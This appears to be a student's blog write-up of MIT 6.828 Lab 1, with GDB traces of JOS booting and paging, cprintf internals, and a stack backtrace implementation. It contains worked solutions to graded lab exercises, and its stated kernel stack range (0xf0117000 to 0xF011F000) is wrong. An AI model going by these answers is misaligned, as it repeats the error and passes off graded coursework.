=&gt; 0x7c06: mov %ax,%es0x00007c06 in ?? ()(gdb)...(gdb) si[ 0:7c1e] =&gt; 0x7c1e: lgdtw -0x739c0x00007c1e in ?? ()(gdb) si[ 0:7c23] =&gt; 0x7c23: mov %cr0,%eax0x00007c23 in ?? ()(gdb) si[ 0:7c26] =&gt; 0x7c26: or $0x1,%eax0x00007c26 in ?? ()(gdb) si[ 0:7c2a] =&gt; 0x7c2a: mov %eax,%cr00x00007c2a in ?? ()(gdb) si[ 0:7c2d] =&gt; 0x7c2d: ljmp $0x8,$0x8c320x00007c2d in ?? () I don’t know how the negative address is processed by CPU…it’s wired. But the GDT is still at 0x7c64, Both 0x739c and-0x739care wrong. 123456(gdb) x/6xb -0x739c0xffff8c64: 0x04 0x26 0x67 0x66 0x89 0x07(gdb) x/6xb 0x7c640x7c64: 0x17 0x00 0x4c 0x8c 0x00 0x00(gdb) x/6xb 0x739c0x739c: 0x00 0x00 0x00 0x00 0x00 0x00 In protected mode, the translation from logical address to physical address is more that CS:IP way, where GDT is a necessary part. GDT also described whether the segment is writeable, that’s how it “protect” memory. More details Here Address translation methods have changed after 0x7c2a, but GDT is not ready, so boot loader crashed. 6 Exercise 6. We can examine memory using GDB’s x command. The GDB manual has full details, but for now, it is enough to know that the command x/Nx ADDR prints N words of memory at ADDR. (Note that both ‘x‘s in the command are lowercase.) Warning: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the ‘w’ in xorw, which stands for word, means 2 bytes). Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.) 123456789101112131415161718192021(gdb) b *0x7c00Breakpoint 1 at 0x7c00(gdb) cContinuing.[ 0:7c00] =&gt; 0x7c00: cliBreakpoint 1, 0x00007c00 in ?? ()(gdb) x/8x 0x001000000x100000: 0x00000000 0x00000000 0x00000000 0x000000000x100010: 0x00000000 0x00000000 0x00000000 0x00000000(gdb) b *0x10000cBreakpoint 2 at 0x10000c(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0x10000c: movw $0x1234,0x472Breakpoint 2, 0x0010000c in ?? ()(gdb) x/8x 0x001000000x100000: 0x1badb002 0x00000000 0xe4524ffe 0x7205c7660x100010: 0x34000004 0x7000b812 0x220f0011 0xc0200fd8 At breakpoint 1 , it’s null because nothing hasn’t been done here yet. At breakpoint 2, it’s filled with data because kernel was loaded just here from 0x100000. This is consistent with the disassembly file(X86 is little-endian it’s LSB first in the memory) 123456789101112# /obj/kern/kernel.asm.globl entryentry: movw $0x1234,0x472 # warm bootf0100000: 02 b0 ad 1b 00 00 add 0x1bad(%eax),%dhf0100006: 00 00 add %al,(%eax)f0100008: fe 4f 52 decb 0x52(%edi)f010000b: e4 66 in $0x66,%alf010000c &lt;entry&gt;:f010000c: 66 c7 05 72 04 00 00 movw $0x1234,0x472f0100013: 34 12 And it’s worth noting that the address growth direction has changed into High→Low in GDB 12345678910Breakpoint 2, 0x0010000c in ?? ()(gdb) x/8x 0x001000000x100000: 0x1badb002 0x00000000 0xe4524ffe 0x7205c7660x100010: 0x34000004 0x7000b812 0x220f0011 0xc0200fd8(gdb) si=&gt; 0x100015: mov $0x117000,%eax0x00100015 in ?? ()(gdb) si=&gt; 0x10001a: mov %eax,%cr30x0010001a in ?? () 7 Exercise 7. Use QEMU and GDB to trace into the JOS kernel and stop at the movl %eax, %cr0. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using the stepi GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened. What is the first instruction after the new mapping is established that would fail to work properly if the mapping weren’t in place? Comment out the movl %eax, %cr0 in kern/entry.S, trace into it, and see if you were right. The instruction mention above is at 0x100025 1234567891011121314151617181920212223(gdb) b *0x100025Breakpoint 2 at 0x100025(gdb) cContinuing.=&gt; 0x100025: mov %eax,%cr0Breakpoint 2, 0x00100025 in ?? ()(gdb) x/8x 0x001000000x100000: 0x1badb002 0x00000000 0xe4524ffe 0x7205c7660x100010: 0x34000004 0x7000b812 0x220f0011 0xc0200fd8(gdb) x/8x 0xf01000000xf0100000: 0x00000000 0x00000000 0x00000000 0x000000000xf0100010: 0x00000000 0x00000000 0x00000000 0x00000000(gdb) si=&gt; 0x100028: mov $0xf010002f,%eax0x00100028 in ?? ()(gdb) x/8x 0x001000000x100000: 0x1badb002 0x00000000 0xe4524ffe 0x7205c7660x100010: 0x34000004 0x7000b812 0x220f0011 0xc0200fd8(gdb) x/8x 0xf01000000xf0100000: 0x1badb002 0x00000000 0xe4524ffe 0x7205c7660xf0100010: 0x34000004 0x7000b812 0x220f0011 0xc0200fd8(gdb) Obviously the memory near 0xf0100000 was all zero and after turning on paging it’s the same with data near 0x00100000 Use step through to see what’s next 1234567891011121314151617181920(gdb) b *0x100020Breakpoint 1 at 0x100020(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0x100020: or $0x80010001,%eaxBreakpoint 1, 0x00100020 in ?? ()(gdb) si=&gt; 0x100025: mov $0xf010002c,%eax0x00100025 in ?? ()(gdb) si=&gt; 0x10002a: jmp *%eax0x0010002a in ?? ()(gdb) info reg eaxeax 0xf010002c -267386836(gdb) si=&gt; 0xf010002c: add %al,(%eax)74 movl $0x0,%ebp # nuke frame pointer(gdb) As you see, after turning on paging, the kernel first jump to the address0xf010002c from %eax register and it’s just in the mapping range. We have known before that jmp is to change the value of %eip , so it won’t crash the kernel. 1234567(gdb) info reg eipeip 0x10002a 0x10002a(gdb) si=&gt; 0xf010002c: add %al,(%eax)74 movl $0x0,%ebp # nuke frame pointer(gdb) info reg eipeip 0xf010002c 0xf010002c But when you about to execute the instruction on that address, which is illegal, the kernel will crash, even the QEMU crashed too. 1234567891011121314151617181920212223242526272829qemu: fatal: Trying to execute code outside RAM or ROM at 0xf010002cEAX=f010002c EBX=00010074 ECX=00000000 EDX=000000d5ESI=00010074 EDI=00000000 EBP=00007bf8 ESP=00007becEIP=f010002c EFL=00000086 [--S--P-] CPL=0 II=0 A20=1 SMM=0 HLT=0ES =0010 00000000 ffffffff 00cf9300 DPL=0 DS [-WA]CS =0008 00000000 ffffffff 00cf9a00 DPL=0 CS32 [-R-]SS =0010 00000000 ffffffff 00cf9300 DPL=0 DS [-WA]DS =0010 00000000 ffffffff 00cf9300 DPL=0 DS [-WA]FS =0010 00000000 ffffffff 00cf9300 DPL=0 DS [-WA]GS =0010 00000000 ffffffff 00cf9300 DPL=0 DS [-WA]LDT=0000 00000000 0000ffff 00008200 DPL=0 LDTTR =0000 00000000 0000ffff 00008b00 DPL=0 TSS32-busyGDT= 00007c4c 00000017IDT= 00000000 000003ffCR0=00000011 CR2=00000000 CR3=00117000 CR4=00000000DR0=00000000 DR1=00000000 DR2=00000000 DR3=00000000DR6=ffff0ff0 DR7=00000400CCS=00000084 CCD=80010011 CCO=EFLAGSEFER=0000000000000000FCW=037f FSW=0000 [ST=0] FTW=00 MXCSR=00001f80FPR0=0000000000000000 0000 FPR1=0000000000000000 0000FPR2=0000000000000000 0000 FPR3=0000000000000000 0000FPR4=0000000000000000 0000 FPR5=0000000000000000 0000FPR6=0000000000000000 0000 FPR7=0000000000000000 0000XMM00=00000000000000000000000000000000 XMM01=00000000000000000000000000000000XMM02=00000000000000000000000000000000 XMM03=00000000000000000000000000000000XMM04=00000000000000000000000000000000 XMM05=00000000000000000000000000000000XMM06=00000000000000000000000000000000 XMM07=00000000000000000000000000000000make: *** [qemu-gdb] Abort trap: 6 8 Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form “%o”. Find and fill in this code fragment. In lib/printfmt.c , Line 207 123456case 'o': // Replace this with your code. putch('X', putdat); putch('X', putdat); putch('X', putdat); break; to 1234case 'o': num = getuint(&amp;ap, lflag); base = 8; goto number; Be able to answer the following questions: Explain the interface between printf.c and console.c. Specifically, what function does console.c export? How is this function used by printf.c? The implementation of cprintf (in printf.c) is based on the cputchar() function (in console.c), which outputs a character to the console. Explain the following from console.c: 12345678910111213141516void * memmove(void *dst, const void *src, size_t n)// CRT should be Cathode Ray Tube. A material used in early displays// if display is fullif (crt_pos &gt;= CRT_SIZE){ int i; // removes the first row memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t)); // make the last line empty for (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++) // BUT WHAT IS THIS MAGIC NUMBER? crt_buf[i] = 0x0700 | ' '; // updates the cursor postion crt_pos -= CRT_COLS;} For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC’s calling convention on the x86. Trace the execution of the following code step-by-step: 12int x = 1, y = 3, z = 4;cprintf(&quot;x %d, y %x, z %d\\n&quot;, x, y, z); In the call to cprintf(), to what does fmt point? To what does ap point? fmt is string literal “x %d, y %x, z %d\\n” ap is pointing the first var, namely x List (in order of execution) each call to cons_putc, va_arg, and vcprintf. For cons_putc, list its argument as well. For va_arg, list what ap points to before and after the call. For vcprintf list the values of its two arguments. SKIP Run the following code. 12unsigned int i = 0x00646c72;cprintf(&quot;H%x Wo%s&quot;, 57616, &amp;i); What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. Here’s an ASCII table that maps bytes to characters. Output 1He110 World From kernel.asm, we can know that I was stored in memory by LSB-First or Little-endian 1234unsigned int i = 0x00646c72;f0100046: c7 45 f4 72 6c 64 00 movl $0x646c72,-0xc(%ebp)...f0100063: e8 a6 08 00 00 call f010090e &lt;cprintf&gt; Let’s set a breakpoint at 0xf0100063 and check the value in memory 12345678910111213141516(gdb) b *0xf0100063Breakpoint 1 at 0xf0100063: file kern/init.c, line 14.(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0xf0100063 &lt;exercise8+35&gt;: call 0xf010090e &lt;cprintf&gt;Breakpoint 1, 0xf0100063 in exercise8 () at kern/init.c:1414 cprintf(&quot;H%x Wo%s&quot;, 57616, &amp;i);(gdb) x/b 0xf01000490xf0100049 &lt;exercise8+9&gt;: 114 'r'(gdb) x/b 0xf010004a0xf010004a &lt;exercise8+10&gt;: 108 'l'(gdb) x/b 0xf010004b0xf010004b &lt;exercise8+11&gt;: 100 'd' Just as expected. 57616 in decimal is e110 in hex, which is easy to understand. The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set i to in order to yield the same output? Would you need to change 57616 to a different value? 1234// unsigned int little = 0x646c72;unsigned int big = 0x726c64;// Now the output should be// He110 Wodlr on Little-endian PCs No need to change 57616 Here’s a description of little- and big-endian and a more whimsical description. In the following code, what is going to be printed after 'y='? (note: the answer is not a specific value.) Why does this happen? 1cprintf(&quot;x=%d y=%d&quot;, 3); See the kernel.asm 12345678f0100040: 55 push %ebpf0100041: 89 e5 mov %esp,%ebpf0100043: 83 ec 18 sub $0x18,%esp cprintf(&quot;x=%d y=%d&quot;, 3);f0100046: c7 44 24 04 03 00 00 movl $0x3,0x4(%esp)f010004d: 00 f010004e: c7 04 24 c0 17 10 f0 movl $0xf01017c0,(%esp)f0100055: e8 a8 08 00 00 call f0100902 &lt;cprintf&gt; 0x4(%esp) meansESP+4 Move to GDB 1234567891011121314(gdb) b *0xf0100055Breakpoint 1 at 0xf0100055: file kern/init.c, line 13.(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0xf0100055 &lt;exercise8+21&gt;: call 0xf0100902 &lt;cprintf&gt;Breakpoint 1, 0xf0100055 in exercise8 () at kern/init.c:1313 cprintf(&quot;x=%d y=%d&quot;, 3);(gdb) info reg espesp 0xf0117fc0 0xf0117fc0(gdb) x/8d 0xf0117fc00xf0117fc0: 6080 -4080 3 0 0 0 116 1 And output is x=3 y=0 . It’s obviously that although only 1 argument pushed, cprintf() will continue to find the next value in memory Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change cprintf or its interface so that it would still be possible to pass it a variable number of arguments? SKIP. Challenge Enhance the console to allow text to be printed in different colors. The traditional way to do this is to make it interpret ANSI escape sequences embedded in the text strings printed to the console, but you may use any mechanism you like. There is plenty of information on the 6.828 reference page and elsewhere on the web on programming the VGA display hardware. If you’re feeling really adventurous, you could try switching the VGA hardware into a graphics mode and making the console draw text onto the graphical frame buffer. 9 Exercise 9. Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which “end” of this reserved area is the stack pointer initialized to point to? The two lines in entry.S below initialize the kernel’s stack: 12movl $0x0,%ebp movl $(bootstacktop),%esp According to the disassembled file kernel.asm, the stack locates at 0xf0117000. 1234 movl $0x0,%ebp # nuke frame pointerf010002f: bd 00 00 00 00 mov $0x0,%ebp movl $(bootstacktop),%espf0100034: bc 00 70 11 f0 mov $0xf0117000,%esp The stack space is given by .space KSTKSIZE in entry.S. According to /inc/memlayout.h and inc/mmu.h 12#define KSTKSIZE (8*PGSIZE) // size of a kernel stack#define PGSIZE 4096 // bytes mapped by a page We can know that KSTKSIZE = 8*4096 = 32768 = 0x8000 So stack range from 0xf0117000 to 0xF011F000 in Virtual Memory, or 0x117000 to0x11F000 12345678EBP ---------------- 0xF011F000 (Bottom) Stack(Virtual Memory Address)ESP ---------------- 0xf0117000 (Top) 10 Exercise 10. To become familiar with the C calling conventions on the x86, find the address of the test_backtrace function in obj/kern/kernel.asm, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of test_backtrace push on the stack, and what are those words? To understand how a stack frame is set up and taken down when a C function call is made, refer to C Function Call Conventions and the Stack. Each recursive nesting level of test_backtrace pushes 8 32-bit words on the stack. The are the function’s return address, arguments, stack base pointer EBP, etc. Set a breakpoint at 0xf0100040 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263(gdb) b *0xf0100040Breakpoint 1 at 0xf0100040: file kern/init.c, line 13.(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0xf0100040 &lt;test_backtrace&gt;: push %ebpBreakpoint 1, test_backtrace (x=5) at kern/init.c:1313 {(gdb) x/8x $esp// Return add (ESP+8)0xf0116fdc: 0xf01000ea 0x00000005 0x00001aac 0x000006400xf0116fec: 0x00000000 0x00000000 0x00000000 0x00000000(gdb) cContinuing.=&gt; 0xf0100040 &lt;test_backtrace&gt;: push %ebpBreakpoint 1, test_backtrace (x=4) at kern/init.c:1313 {(gdb) x/8x $esp // Return add (ESP+8)0xf0116fbc: 0xf0100069 0x00000004 0x00000005 0x000000000xf0116fcc: 0x00010074 0x00010074 0x00010074 0xf0116ff8(Caller's EBP)(gdb) cContinuing.=&gt; 0xf0100040 &lt;test_backtrace&gt;: push %ebpBreakpoint 1, test_backtrace (x=3) at kern/init.c:1313 {(gdb) x/8x $esp// Return add (ESP+8)0xf0116f9c: 0xf0100069 0x00000003 0x00000004 0x000000000xf0116fac: 0x00000000 0x00000000 0x00000005 0xf0116fd8(Caller's EBP)(gdb) cContinuing.=&gt; 0xf0100040 &lt;test_backtrace&gt;: push %ebpBreakpoint 1, test_backtrace (x=2) at kern/init.c:1313 {(gdb) x/8x $esp// Return add (ESP+8)0xf0116f7c: 0xf0100069 0x00000002 0x00000003 0xf0116fb80xf0116f8c: 0x00000000 0xf0100898 0x00000004 0xf0116fb8(Caller's EBP)(gdb) cContinuing.=&gt; 0xf0100040 &lt;test_backtrace&gt;: push %ebpBreakpoint 1, test_backtrace (x=1) at kern/init.c:1313 {(gdb) x/8x $esp// Return add (ESP+8)0xf0116f5c: 0xf0100069 0x00000001 0x00000002 0xf0116f980xf0116f6c: 0x00000000 0xf0100898 0x00000003 0xf0116f98(Caller's EBP)(gdb) cContinuing.=&gt; 0xf0100040 &lt;test_backtrace&gt;: push %ebpBreakpoint 1, test_backtrace (x=0) at kern/init.c:1313 {(gdb) x/8x $esp// Return add (ESP+8) (ESP+12)0xf0116f3c: 0xf0100069 0x00000000 0x00000001 0xf0116f780xf0116f4c: 0x00000000 0xf0100898 0x00000002 0xf0116f78(Caller's EBP) 11 Exercise 11. Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, run make grade to see if its output conforms to what our grading script expects, and fix it if it doesn’t. After you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like. If you use read_ebp(), note that GCC may generate “optimized” code that calls read_ebp() before mon_backtrace()‘s function prologue, which results in an incomplete stack trace (the stack frame of the most recent function call is missing). While we have tried to disable optimizations that cause this reordering, you may want to examine the assembly of mon_backtrace() and make sure the call to read_ebp() is happening after the function prologue. 12345678910111213141516intmon_backtrace(int argc, char **argv, struct Trapframe *tf){ uint32_t ebp = read_ebp(); cprintf(&quot;Stack backtraces:\\n&quot;); /* ebp's initial value is set to 0 in kern/entry.S */ while (ebp != 0) { /* eip and arguments' addresses can be inferred from ebp */ cprintf(&quot; ebp %08x eip %08x args %08x %08x %08x %08x %08x\\n&quot;, ebp, *(uint32_t *)(ebp + 4), *(uint32_t *)(ebp + 8), *(uint32_t *)(ebp + 12), *(uint32_t *)(ebp + 16), *(uint32_t *)(ebp + 20), *(uint32_t *)(ebp + 24)); /* obtain caller's ebp */ ebp = *(uint32_t *)ebp; } return 0;} 12At this point, your backtrace function should give you the addresses of the function callers on the stack that lead to mon_backtrace() being executed. However, in practice you often want to know the function names corresponding to those addresses. For instance, you may want to know which functions could contain a bug that’s causing your kernel to crash. To help you implement this functionality, we have provided the function debuginfo_eip(), which looks up eip in the symbol table and returns the debugging information for that address. This function is defined in kern/kdebug.c. Exercise 12. Modify your stack backtrace function to display, for each eip, the function name, source file name, and line number corresponding to that eip. In debuginfo_eip, where do __STAB_* come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do: look in the file kern/kernel.ld for __STAB_* run objdump -h obj/kern/kernel run objdump -G obj/kern/kernel run gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern/init.c, and look at init.s. see if the bootloader loads the symbol table in memory as part of loading the kernel binary Complete the implementation of debuginfo_eip by inserting the call to stab_binsearch to find the line number for an address. Add a backtrace command to the kernel monitor, and extend your implementation of mon_backtrace to call debuginfo_eip and print a line for each stack frame of the form: 123456789K&gt; backtraceStack backtrace: ebp f010ff78 eip f01008ae args 00000001 f010ff8c 00000000 f0110580 00000000 kern/monitor.c:143: monitor+106 ebp f010ffd8 eip f0100193 args 00000000 00001aac 00000660 00000000 00000000 kern/init.c:49: i386_init+59 ebp f010fff8 eip f010003d args 00000000 00000000 0000ffff 10cf9a00 0000ffff kern/entry.S:70: &lt;unknown&gt;+0K&gt; Each line gives the file name and line within that file of the stack frame’s eip, followed by the name of the function and the offset of the eip from the first instruction of the function (e.g., monitor+106 means the return eip is 106 bytes past the beginning of monitor). Be sure to print the file and function names on a separate line, to avoid confusing the grading script. Tip: printf format strings provide an easy, albeit obscure, way to print non-null-terminated strings like those in STABS tables. printf(&quot;%.*s&quot;, length, string) prints at most length characters of string. Take a look at the printf man page to find out why this works. You may find that some functions are missing from the backtrace. For example, you will probably see a call to monitor() but not to runcmd(). This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of the -O2 from GNUMakefile, the backtraces may make more sense (but your kernel will run more slowly). kdebug.c 1234567stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);if (lline &lt;= rline) { info-&gt;eip_line = stabs[lline].n_desc;} else { // Couldn't find a line number. return -1; } monitor.c 1234567891011121314151617181920212223intmon_backtrace(int argc, char **argv, struct Trapframe *tf){ uint32_t ebp = read_ebp(); struct Eipdebuginfo info; cprintf(&quot;Stack backtraces:\\n&quot;); /* ebp's initial value is set to 0 in kern/entry.S */ while (ebp != 0) { /* eip and arguments' addresses can be inferred from ebp */ cprintf(&quot; ebp %08x eip %08x args %08x %08x %08x %08x %08x\\n&quot;, ebp, *(uint32_t *)(ebp + 4), *(uint32_t *)(ebp + 8), *(uint32_t *)(ebp + 12), *(uint32_t *)(ebp + 16), *(uint32_t *)(ebp + 20), *(uint32_t *)(ebp + 24)); /* look up eip in the symbol table and obtain more debugging info */ if (debuginfo_eip(*(uint32_t *)(ebp + 4), &amp;info) == 0) { cprintf(&quot; %s:%d: %.*s+%d\\n&quot;, info.eip_file, info.eip_line, info.eip_fn_namelen, info.eip_fn_name, *(uint32_t *)(ebp + 4) - info.eip_fn_addr); } /* obtain caller's ebp */ ebp = *(uint32_t *)ebp; } return 0;} Done.","link":"/2021/10/29/6-828-Lab1/"}],"tags":[{"name":"OS","slug":"OS","link":"/tags/OS/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"UEFI","slug":"UEFI","link":"/tags/UEFI/"},{"name":"Reversing","slug":"Reversing","link":"/tags/Reversing/"},{"name":"Hackintosh","slug":"Hackintosh","link":"/tags/Hackintosh/"},{"name":"LeagueClient","slug":"LeagueClient","link":"/tags/LeagueClient/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Scrapy","slug":"Scrapy","link":"/tags/Scrapy/"},{"name":"Socket","slug":"Socket","link":"/tags/Socket/"},{"name":"HTTP","slug":"HTTP","link":"/tags/HTTP/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Javascript","slug":"Javascript","link":"/tags/Javascript/"},{"name":"Electron","slug":"Electron","link":"/tags/Electron/"},{"name":"Shell","slug":"Shell","link":"/tags/Shell/"},{"name":"GNU","slug":"GNU","link":"/tags/GNU/"},{"name":"AI","slug":"AI","link":"/tags/AI/"},{"name":"WSL","slug":"WSL","link":"/tags/WSL/"},{"name":"Tutorial","slug":"Tutorial","link":"/tags/Tutorial/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"OnlineJudge","slug":"OnlineJudge","link":"/tags/OnlineJudge/"},{"name":"Sandboxing","slug":"Sandboxing","link":"/tags/Sandboxing/"},{"name":"Life","slug":"Life","link":"/tags/Life/"},{"name":"IPC","slug":"IPC","link":"/tags/IPC/"}],"categories":[{"name":"瞎折腾","slug":"瞎折腾","link":"/categories/%E7%9E%8E%E6%8A%98%E8%85%BE/"}]}